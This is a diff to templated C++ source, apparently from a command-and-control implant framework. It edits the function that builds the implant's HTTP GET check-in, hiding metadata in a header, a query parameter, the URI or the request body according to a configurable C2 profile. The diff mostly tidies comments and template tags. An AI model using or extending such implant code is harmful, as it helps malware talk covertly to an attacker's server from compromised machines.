@@ -61,46 +61,29 @@ nlohmann::json get(std::string implant_uuid) {
     // --- End MetaData Transforms ---
 
     //base variables declared near top so they are in scope
-    //note - using scopes for each option
     // Start with the base URI from the profile
     std::wstring uri = L"[[ http_get_uri ]]";
     std::string request_body = ""; // NULL by default, as that's what the wininet wants
     std::wstring w_metadata(metadata.begin(), metadata.end()); //convert metadata str to w_metadata for winapi (wide)
 
-    [# // --- Add addtl headers/params as specified in mc2 ---
-    [%- for header_or_param in http_get_client_headers_or_parameters_list %]
-    [[ render_add_headers_or_parameters(header_or_param) ]]
-    [%- endfor %]
-    // --- end --- #]
-
-
-    //where to store metadata - note, could macro this?
-    //key, ex, header
-
-
     [# HTTP_GET: METADATA: HEADER - IF MC2 says it wants a header for where to find the metadata... #]
     [%- if http_get_client_metadata_terminator == "header" %]
-    
     headers.push_back(L"[[http_get_client_metadata_terminator_value]]" + L": " + w_metadata);
-    
-    [%- endif %]
+    [% endif %]
 
     [# HTTP_GET: METADATA: PARAMETER - IF MC2 says it wants a header for where to find the metadata... #]
     [#(e.g., /search?q=BASE64...)#]
     [%- if http_get_client_metadata_terminator == "parameter" %]
-
     // Append '?' or '&' depending on existing query string
     if (uri.find(L'?') != std::wstring::npos) {
         uri += L"&";
     } else {
         uri += L"?";
     }
-
     uri += L"[[http_get_client_metadata_terminator_value]]";
     uri += L"=";
     uri += w_metadata;
-
-    [%- endif %]
+    [% endif %]
 
     [# HTTP_GET: METADATA: URI - IF MC2 says it wants a header for where to find the metadata... #]
     [%- if http_get_client_metadata_terminator == "uri-append" %]
@@ -111,15 +94,11 @@ nlohmann::json get(std::string implant_uuid) {
     }
     //could use append from transform here too
     uri += w_metadata;
-
-    [%- endif %]
+    [% endif %]
 
 
     [# HTTP_GET: METADATA: PRINT - IF MC2 says it wants a header for where to find the metadata... #]
     [%- if http_get_client_metadata_terminator == "print" %]
-    [# put in body 
-    TLDR: NULL or none if no data, so pass that if not set here.
-    #]
     
     //convert back to string for HTTP_GET function
     request_body.assign(w_metadata.begin(), w_metadata.end());
